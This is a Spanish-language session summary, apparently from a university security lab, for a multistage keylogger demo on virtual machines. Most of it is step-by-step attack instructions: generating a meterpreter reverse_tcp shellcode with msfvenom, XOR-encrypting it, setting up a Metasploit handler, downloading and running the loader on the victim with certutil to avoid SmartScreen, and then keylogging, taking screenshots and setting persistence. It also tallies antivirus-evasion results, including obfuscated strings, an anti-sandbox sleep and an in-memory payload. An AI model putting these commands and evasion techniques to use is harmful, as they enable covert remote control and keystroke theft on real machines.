# Resumen sesión — Demo keylogger multistage

## Arquitectura final

```
[Windows víctima]         [Parrot atacante]
loader.exe (Go)     →     server.py  (puerto 8080 — sirve sc.enc)
  descarga sc.enc              ↕
  descifra XOR en RAM    msfconsole (puerto 5555 — recibe meterpreter)
  inyecta shellcode en memoria
  ────────────────────────────────────────────────────────────────
  meterpreter activo  ←→  sesión abierta en Metasploit
```

---

## Archivos del proyecto

| Archivo | Qué hace |
|---|---|
| `loader.go` / `dist\loader.exe` | Stage 1 — descarga y ejecuta shellcode en memoria |
| `agent.go` / `dist\WindowsUpdateService.exe` | Keylogger Go (para donut si se quiere shellcode propio) |
| `server.py` | Servidor TCP (logs) + HTTP (sirve sc.enc) |
| `config.py` | IP, puerto, clave AES |
| `sc.enc` | Shellcode msfvenom cifrado con XOR — **se genera mañana en Parrot** |

---

## Logros de esta sesión (para el informe)

| Técnica | Resultado |
|---|---|
| PyInstaller original | 18 detecciones VirusTotal |
| Binario Go nativo | 5 detecciones |
| GetAsyncKeyState (sin hook global) | Elimina API sospechosa |
| Strings XOR ofuscadas en binario | Invisible a análisis estático |
| Sleep 12s anti-sandbox | Evade sandboxes con límite de tiempo |
| Payload cifrado en memoria (shellcode) | Nunca toca el disco |
| Comunicación AES-256-GCM | Tráfico cifrado |
| **Loader multistage final** | **7 detecciones** |

---

## Pasos para mañana

### Paso 1 — Compilar loader en Windows (si no está compilado)
> **Dónde:** PowerShell en Windows, carpeta del proyecto

```powershell
cd C:\Users\Nico\Documents\keylogger
go build -ldflags "-s -w -H windowsgui" -o dist\loader.exe loader.go
```

Verificar que existe `dist\loader.exe`.

---

### Paso 2 — Copiar loader.exe a Parrot
> **Dónde:** Terminal normal en Parrot (NO msfconsole)

```bash
# Opción A — desde Windows con SCP
scp dist\loader.exe usuario@IP_PARROT:/home/usuario/keylogger/

# Opción B — levantar servidor HTTP en Windows y descargar desde Parrot
# En Windows:
python -m http.server 9090
# En Parrot:
wget http://IP_WINDOWS:9090/dist/loader.exe -O /home/usuario/keylogger/loader.exe
```

---

### Paso 3 — Generar shellcode msfvenom
> **Dónde:** Terminal normal en Parrot (NO msfconsole)

```bash
cd ~/keylogger   # o donde tengas el proyecto en Parrot

# Cambiar IP por la IP real de Parrot
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=TU_IP LPORT=5555 -f raw -o meterpreter.raw

# Cifrar con XOR para que el loader pueda descifrarla
python3 -c "
key = b'SecurityUTalca2026'
data = open('meterpreter.raw','rb').read()
enc = bytes(b ^ key[i%len(key)] for i,b in enumerate(data))
open('sc.enc','wb').write(enc)
print(f'Shellcode listo: {len(enc)} bytes')
"
```

---

### Paso 4 — Iniciar server.py
> **Dónde:** Terminal normal en Parrot (NO msfconsole) — Terminal 1

```bash
cd ~/keylogger
python3 server.py
```

Debe mostrar:
```
[*] Payload HTTP en 0.0.0.0:8080/payload
[*] Escuchando en 0.0.0.0:4444
```

---

### Paso 5 — Iniciar Metasploit handler
> **Dónde:** msfconsole — Terminal 2 (terminal separada de server.py)

```bash
# Abrir msfconsole
msfconsole
```

Dentro de msfconsole, escribir estos comandos uno por uno:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 5555
set ExitOnSession false
run
```

Debe quedar esperando conexiones:
```
[*] Started reverse TCP handler on 0.0.0.0:5555
```

---

### Paso 6 — Ejecutar loader en la víctima Windows
> **Dónde:** VM Windows víctima

**Opción A — con certutil (evita SmartScreen):**
```cmd
certutil -urlcache -split -f http://IP_PARROT:8080/loader.exe %TEMP%\svc.exe
%TEMP%\svc.exe
```

**Opción B — carpeta compartida VirtualBox:**
```
VirtualBox → Dispositivos → Carpetas compartidas
→ Agregar carpeta dist\ del proyecto Windows
→ En la VM acceder a \\vboxsvr\dist\loader.exe
```

Esperar ~12 segundos (sleep anti-sandbox del loader).

---

### Paso 7 — Operar desde meterpreter
> **Dónde:** msfconsole (donde quedó el handler corriendo)

Cuando aparezca la sesión:
```
[*] Meterpreter session 1 opened
meterpreter >
```

Comandos para la demo:

```
# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# Información del sistema
sysinfo
getuid
getpid

# Screenshot
screenshot

# Persistencia (ya la hace el loader automáticamente via registro)
run persistence -h
```

---

## Puertos en uso

| Puerto | Protocolo | Para qué |
|---|---|---|
| `4444` | TCP | server.py recibe logs cifrados AES del keylogger |
| `5555` | TCP | Metasploit recibe conexión meterpreter |
| `8080` | HTTP | server.py sirve sc.enc al loader |

---

## Si algo falla

**loader.exe no conecta:**
- Verificar que `server.py` está corriendo en Parrot
- Verificar IP en `loader.go` (compilar de nuevo si se cambió)
- Verificar firewall de Parrot: `sudo ufw allow 5555` y `sudo ufw allow 8080`

**msfconsole no recibe sesión:**
- Verificar que LHOST en msfvenom coincide con la IP real de Parrot
- Verificar que LPORT 5555 no está bloqueado
- El loader espera 12 segundos antes de conectar — tener paciencia

**sc.enc no se sirve:**
- Verificar que `sc.enc` está en la misma carpeta que `server.py`
- Verificar que server.py muestra el mensaje de puerto 8080
